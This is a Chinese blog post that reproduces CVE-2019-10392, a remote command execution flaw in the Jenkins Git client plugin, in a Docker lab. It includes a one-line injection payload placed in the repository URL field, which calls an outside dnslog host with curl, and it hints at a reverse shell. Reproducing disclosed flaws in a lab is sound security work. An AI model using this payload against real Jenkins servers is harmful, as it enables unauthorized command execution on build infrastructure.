# CVE-2019-10392：Jenkins Git client 插件 RCE 复现 - PaperPen - 博客园

> 原文：[`www.cnblogs.com/paperpen/p/11626231.html`](https://www.cnblogs.com/paperpen/p/11626231.html)

**0x00 简介**

Jenkins 是一个开源软件项目，是基于 Java 开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件的持续集成变成可能。

**0x01 漏洞概述**

Git 客户端插件中的系统命令执行漏洞，这是以允许具有 Job/Configure 权限的攻击者在 Jenkins 主服务器上执行任意系统命令作为 Jenkins 进程正在运行的 OS 用户的方式实现命令执行。

**0x02 影响范围**

Git client Plugin <= 2.8.4

**0x03 环境搭建**

docker search Jenkins

docker pull jenkins/jenkins

docker run -d -p 8080:8080 -p 50000:50000 jenkins/jenkins

![](img/6255cdecff02969f9b9a13906f3fa3f0.png)

等待 1~2 分钟后（启动较慢），浏览器访问 ip:8080 进入环境

![](img/de20691e22ae70200f700eac68858863.png)

docker exec -it 2d0c55ad015c /bin/bash

cat /var/jenkins_home/secrets/initialAdminPassword

![](img/e15e3a976db52b7fb68ef221205a6cd1.png)

输入密码后继续下一步，安装推荐的插件，这个安装过程要花比较长的时间，15~20 分钟

![](img/f3c21f1add4913967e9d4b2207b2ad38.png)

继续下一步，创建一个管理员

![](img/737f63d1ee2aa50b53dc813dcd257147.png)

继续下一步，就进入了 Jenkins 主页面

系统管理 -- 管理用户 -- 新建用户，创建一个 user 账户

![](img/a2f437473f8388cbfe9e290531e95b68.png)

然后进入：系统管理 -- 全局安全配置，为 user 账户配置如下权限

![](img/15b034a99d0ed06ed4795557e1f4f076.png)

下载漏洞版本的插件（推荐安装的都是官网的最新版本）

git 客户端：http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi

git 插件：http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi

然后进入：系统管理 -- 插件管理 -- 高级，将两个插件上传

![](img/27bea3127b7c9d85944678d9cc032af8.png)

都上传完后点击下图的安装完成后重启 Jenkins 即可重新启动服务

![](img/0bdcc1c88dfd0f36dcdbae1a5be70afb.png)

**0x04 漏洞利用**

重启后，登录 user 账户

新建任务 -- 流水线

![](img/0fd395c85ab0a5e0c894cd6eb30daec4.png)

确定后，点击流水线

![](img/c108da08099a0ba916a48f51248b3e99.png)

选择以下选项，输入 Poc（使用 dnslog 检测）：

--upload-pack="`curl ysp8lf.dnslog.cn`"

![](img/be8e8c4070547eee28942fd07b880b84.png)

查看 dnslog，检测到流量

![](img/b564c70ee42e86a31ecf39ab934ff4b4.png)

反弹 shell 后便可以做你想做的事情了

**Poc 脚本：**

https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc

**参考链接：**

https://mp.weixin.qq.com/s/Axx7KYm9irAQv7ZIO8autg

更多复现内容请关注公众号 Timeline Sec

![](img/d4ebb59d4a29b72a1e5a9f09686cce2a.png)